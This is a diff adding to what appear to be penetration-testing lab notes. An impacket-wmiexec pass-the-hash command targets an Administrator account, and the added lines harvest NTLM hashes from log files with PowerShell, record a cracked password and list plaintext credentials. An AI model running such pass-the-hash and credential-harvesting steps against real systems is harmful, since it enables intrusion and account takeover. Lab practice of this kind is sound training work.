@@ -134,3 +134,24 @@ Semi-interactive shell:
 └──╼ #impacket-wmiexec -hashes 00000000000000000000000000000000:b2c03054c306ac8fc5f9d188710b0168 Administrator@192.168.186.121
 
 ```
+
+```
+joe:Flowers1 on .11
+```
+
+### .11 hashes found
+```
+PS C:\Users\joe\Documents> cat *.log | findstr /V "A handle to an object was requested...."
+cat *.log | findstr /V "A handle to an object was requested...."
+   88934 Oct 04 11:21  Backup      daisy                        6872 Backup Completed. NTLM: abf36048c1cf88f5603381c5128feb8e 
+   88137 Oct 04 11:21  Backup      wario                        6872 Backup Completed. NTLM: fdf36048c1cf88f5630381c5e38feb8e                                                                                                                  
+   87139 Oct 04 11:21  Backup      goomba                       6872 Backup Completed. NTLM: 8e9e1516818ce4e54247e71e71b5f436
+
+abf36048c1cf88f5603381c5128feb8e
+fdf36048c1cf88f5630381c5e38feb8e
+8e9e1516818ce4e54247e71e71b5f436
+
+fdf36048c1cf88f5630381c5e38feb8e:Mushroom! 
+
+wario:Mushroom!
+```
